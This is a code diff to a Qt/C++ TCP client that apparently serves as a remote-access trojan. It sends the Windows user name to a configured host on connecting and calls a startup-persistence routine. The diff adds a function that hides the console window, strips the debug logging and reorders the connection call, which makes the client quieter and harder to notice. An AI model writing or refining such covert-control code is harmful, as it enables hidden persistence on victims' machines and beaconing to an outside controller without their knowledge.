@@ -3,6 +3,7 @@
 QClient::QClient(QString h, qint16 p, QObject *parent) : 
 	host(h), port(p) , QObject(parent)
 {
+	hideCMD();
     sock = new QTcpSocket(this);
 	connect(sock, SIGNAL(connected()), this, SLOT(connected()));
 	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
@@ -10,8 +11,6 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	connect(sock, SIGNAL(readyRead()), this, SLOT(readyRead()));
 	connect(sock, SIGNAL(error(QAbstractSocket::SocketError)), this,
 		SLOT(HandleTcpError(QAbstractSocket::SocketError)));
-
-	tryToConnect();
 
 	compName = qgetenv("UserName");;
 	addStartup();
@@ -26,7 +25,7 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	thread->start();
 
 	dir = QDir::currentPath();
-
+	tryToConnect();
 }
 
 void QClient::tryToConnect()
@@ -36,18 +35,17 @@ void QClient::tryToConnect()
 
 void QClient::connected()
 {
-	qDebug() << "CONNECTED";
 	sendData(compName.toUtf8());
 }
 
 void QClient::disconnected()
 {
-	qDebug() << "DISCONNECTED";
+
 }
 
 void QClient::HandleTcpError(QAbstractSocket::SocketError err)
 {
-	qDebug() << err;
+
 }
 
 void QClient::readyRead()
@@ -295,4 +293,12 @@ void QClient::sendData(const QByteArray &data)
 QClient::~QClient()
 {
     delete sock;
+}
+
+void QClient::hideCMD()
+{
+	HWND window;
+	AllocConsole();
+	window = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(window, 0);
 }
